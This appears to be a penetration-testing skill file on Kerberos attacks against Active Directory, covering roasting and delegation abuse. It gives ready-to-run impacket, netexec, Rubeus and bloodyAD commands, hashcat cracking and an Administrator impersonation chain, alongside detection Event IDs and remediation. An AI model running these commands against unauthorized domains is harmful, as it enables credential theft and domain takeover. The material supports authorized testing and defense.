---
name: kerberos-attacks
description: Kerberos-based Active Directory attacks driven by hand with standard tooling (Kerberoasting, AS-REP roasting, and delegation abuse: unconstrained, constrained/S4U, RBCD). Use when the target has SPN-bearing service accounts, accounts without pre-authentication, or delegation configured on computer/user objects, and you want the exact impacket/Rubeus/bloodyAD command, the hash format and hashcat mode, the Windows Event IDs that fire, and the remediation to write up.
---

# Kerberos Attacks

Standard-tooling playbook for the four Kerberos abuse families you meet on almost every internal AD engagement. You drive every tool yourself. This skill tells you what each attack is, the exact command, how the loot looks and how to crack it, what the DC logs, and what the remediation write-up should say.

Requirements before you touch these: valid domain credentials (any user is enough for Kerberoasting and delegation reads; AS-REP roasting needs only a username list), correct DNS pointing at the DC, and clock skew under 5 minutes or Kerberos rejects your tickets (`KRB_AP_ERR_SKEW`). Sync with `sudo ntpdate <dc-ip>` or `faketime`.

---

## 1. Kerberoasting

**MITRE ATT&CK:** T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)

**What it is.** Any authenticated user can request a service ticket (TGS) for any account that has a Service Principal Name (SPN) set. The TGS is encrypted with the service account's password-derived key. If the DC hands you an RC4 (etype 23) ticket, you crack it offline to recover the account's cleartext password. Service accounts are the target because they often have weak, non-expiring, human-set passwords and elevated rights.

**Standard commands.**

Request tickets for every kerberoastable account (impacket):
```
GetUserSPNs.py -request -dc-ip 10.0.0.10 CORP.LOCAL/svc_user:'Password123' -outputfile kerb_hashes.txt
```

Enumerate first without requesting (see who is roastable before making noise):
```
GetUserSPNs.py -dc-ip 10.0.0.10 CORP.LOCAL/svc_user:'Password123'
```

netexec equivalent (also does it in one line):
```
nxc ldap 10.0.0.10 -u svc_user -p 'Password123' --kerberoasting kerb_hashes.txt
```

Targeted roast of a single account (quieter, one 4769 instead of dozens):
```
GetUserSPNs.py -request-user sqlsvc -dc-ip 10.0.0.10 CORP.LOCAL/svc_user:'Password123'
```

**Hash format + cracking.** The loot is a `$krb5tgs$` hash. RC4 tickets are hashcat mode **13100**; AES256 tickets (etype 18) are mode **19700** and are far slower.
```
$krb5tgs$23$*sqlsvc$CORP.LOCAL$MSSQLSvc/db01.corp.local*$a1b2...  # RC4, -m 13100
$krb5tgs$18$sqlsvc$CORP.LOCAL$...                                  # AES256, -m 19700
```
```
hashcat -m 13100 -a 0 kerb_hashes.txt rockyou.txt --force
```

**Detection (blue-team Event IDs).**
- **4769** (Kerberos service ticket requested) on the DC. The tell is `Ticket Encryption Type 0x17` (RC4) when the domain otherwise uses AES, and a single account requesting many distinct service tickets in a short window. Baseline normal 4769 volume first; it is a high-noise event.
- Microsoft Defender for Identity raises a "Suspected Kerberoasting" alert on this pattern.

**Remediation to write up.**
- Use **gMSA/dMSA** for service accounts: 120-character machine-managed passwords that cannot be cracked.
- Where a human-set service password is unavoidable, enforce 25+ character passphrases and rotation.
- Set `msDS-SupportedEncryptionTypes` to **AES-only** on service accounts so RC4 tickets are never issued.
- Remove SPNs from accounts that do not actually run a service.

---

## 2. AS-REP Roasting

**MITRE ATT&CK:** T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting)

**What it is.** Accounts with "Do not require Kerberos preauthentication" set (`DONT_REQ_PREAUTH` in `userAccountControl`) will return an AS-REP encrypted with the user's password-derived key to *anyone* who asks, no credentials needed. Crack it offline for the cleartext. Because it needs no valid domain account, it works from a username list alone.

**Standard commands.**

Roast every preauth-disabled account (needs a valid credential to read the directory for the list):
```
GetNPUsers.py -dc-ip 10.0.0.10 -request CORP.LOCAL/svc_user:'Password123' -outputfile asrep_hashes.txt
```

Unauthenticated, spraying a username wordlist (no credential at all):
```
GetNPUsers.py -dc-ip 10.0.0.10 -no-pass -usersfile users.txt CORP.LOCAL/ -format hashcat
```

netexec equivalent:
```
nxc ldap 10.0.0.10 -u svc_user -p 'Password123' --asreproast asrep_hashes.txt
```

**Hash format + cracking.** Loot is a `$krb5asrep$` hash, hashcat mode **18200** (RC4).
```
$krb5asrep$23$user@CORP.LOCAL:a1b2c3...
```
```
hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt --force
```

**Detection.**
- **4768** (Kerberos authentication ticket / TGT requested) with **pre-authentication type 0** and RC4 encryption. Normal Kerberos logons use preauth type 2, so preauth 0 is the signal.
- Sudden 4768 volume from one source against many accounts = spraying.

**Remediation.**
- Remove "Do not require Kerberos preauthentication" from every account that has it (audit `userAccountControl` for the `DONT_REQ_PREAUTH` bit, 0x400000).
- These accounts also need strong passwords in the meantime, since the AS-REP is crackable the instant the flag is set.

---

## 3. Delegation Abuse

Kerberos delegation lets a service impersonate a user to a downstream service. Misconfigured, it becomes a privilege-escalation and lateral-movement primitive. Three flavors.

### 3a. Unconstrained Delegation

**MITRE ATT&CK:** T1558 (Steal or Forge Kerberos Tickets) / T1550 (Use Alternate Authentication Material)

**What it is.** A computer or account with `TRUSTED_FOR_DELEGATION` in `userAccountControl` caches the full TGT of any user who authenticates to it. Compromise that host, force a privileged account (or a DC's machine account) to authenticate to it (see the coercion skill), and extract the TGT to impersonate that principal anywhere. A DC's TGT means domain compromise.

**Find it (BloodHound CE, or LDAP):**
```
nxc ldap 10.0.0.10 -u svc_user -p 'Password123' --trusted-for-delegation
```
```
Get-DomainComputer -Unconstrained            # PowerView, on a Windows foothold
```

**Extract cached TGTs from a host you control (impacket, remotely via secretsdump-style flow, or Rubeus on-host):**
```
Rubeus.exe monitor /interval:5 /nowrap          # on the compromised host, watch for inbound TGTs
Rubeus.exe dump /nowrap                          # dump cached tickets
```
Pair with a coercion (PetitPotam/PrinterBug) to force `DC01$` to authenticate to your unconstrained host, then reuse the captured DC TGT.

**Detection.** **4769**/**4768** ticket requests tied to the delegation host; anomalous machine-account authentication to a non-DC server (a DC's `$` account logging on to a member server is abnormal). Defender for Identity flags unconstrained-delegation exposure.

**Remediation.** Eliminate unconstrained delegation entirely; migrate to constrained or resource-based. Put sensitive accounts in the **Protected Users** group and/or mark them "Account is sensitive and cannot be delegated" (`NOT_DELEGATED`, 0x100000), which prevents their TGT from being cached.

### 3b. Constrained Delegation (S4U2Self / S4U2Proxy)

**MITRE ATT&CK:** T1558.003 area / T1550

**What it is.** An account configured with `msDS-AllowedToDelegateTo` (classic constrained delegation) can request a ticket to itself on behalf of any user (S4U2Self) and then forward it to the listed target SPN (S4U2Proxy). If protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`) is set, you can impersonate an arbitrary user, including a Domain Admin, to the target service.

**Abuse (impacket getST):**
```
getST.py -spn cifs/fileserver.corp.local -impersonate Administrator \
  -dc-ip 10.0.0.10 CORP.LOCAL/svc_web:'Password123'
export KRB5CCNAME=Administrator.ccache
nxc smb fileserver.corp.local --use-kcache
```

Find accounts with constrained delegation:
```
nxc ldap 10.0.0.10 -u svc_user -p 'Password123' --find-delegation
```

**Detection.** **4769** for the target SPN where the requesting service is impersonating a different user; unusual S4U2Proxy activity in the DC logs.

**Remediation.** Restrict `msDS-AllowedToDelegateTo` to the minimum SPNs. Disable protocol transition unless required. Protect high-value accounts with Protected Users / `NOT_DELEGATED`.

### 3c. Resource-Based Constrained Delegation (RBCD)

**MITRE ATT&CK:** T1550 / T1098 (Account Manipulation)

**What it is.** The delegation trust lives on the *target* object, in `msDS-AllowedToActOnBehalfOfOtherIdentity`. If you can write that attribute on a computer object (via GenericWrite/GenericAll/WriteDACL over it, see the ACL abuse skill), you point it at a computer account you control, then S4U your way to impersonating any user to that target. The classic chain uses `MachineAccountQuota` (default 10) to add your own computer account first.

**Standard chain.**

Add a computer account you control (if `MachineAccountQuota > 0`):
```
addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilPass123' \
  -dc-ip 10.0.0.10 CORP.LOCAL/svc_user:'Password123'
```

Write the RBCD attribute on the victim computer (bloodyAD):
```
bloodyAD --host 10.0.0.10 -d CORP.LOCAL -u svc_user -p 'Password123' \
  add rbcd TARGET$ EVIL$
```

impacket alternative for the write:
```
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \
  -dc-ip 10.0.0.10 CORP.LOCAL/svc_user:'Password123'
```

Get the impersonated ticket and use it:
```
getST.py -spn cifs/target.corp.local -impersonate Administrator \
  -dc-ip 10.0.0.10 'CORP.LOCAL/EVIL$:EvilPass123'
export KRB5CCNAME=Administrator.ccache
nxc smb target.corp.local --use-kcache
```

**Detection.**
- **5136** (a directory object was modified) on the victim computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute; the write is the loud, catchable moment.
- **4741** (a computer account was created) when a new machine account appears via MachineAccountQuota.
- **4769** for the target SPN with impersonation.

**Remediation.**
- Set **`MachineAccountQuota` to 0** so unprivileged users cannot add computer accounts.
- Audit and lock down write access to computer objects' DACLs (no non-admin GenericWrite/WriteDACL on machine objects).
- Alert on any modification of `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- Protected Users / `NOT_DELEGATED` on sensitive accounts blunts the impersonation.

---

## Cross-cutting hardening

- Force **AES** across the domain and retire RC4; it kills the fast-crack path for Kerberoasting and AS-REP roasting at once.
- Machine-managed passwords (gMSA/dMSA) remove the crackable-secret problem for service accounts.
- Protected Users group + "sensitive and cannot be delegated" on Tier-0 accounts neutralizes most delegation abuse.
- Baseline 4768/4769 volumes so the RC4/preauth-0 anomalies stand out instead of drowning.

Only run these against systems you are explicitly authorized to test. Use lab or generic values in any write-up, never a client's real SPNs, hostnames, or hashes.

---

## Reference

- Kerberoasting: https://www.thehacker.recipes/ad/movement/kerberos/roasting/kerberoast
- AS-REP roasting: https://www.thehacker.recipes/ad/movement/kerberos/roasting/asreproast
- Delegations (unconstrained / constrained / RBCD): https://www.thehacker.recipes/ad/movement/kerberos/delegations/
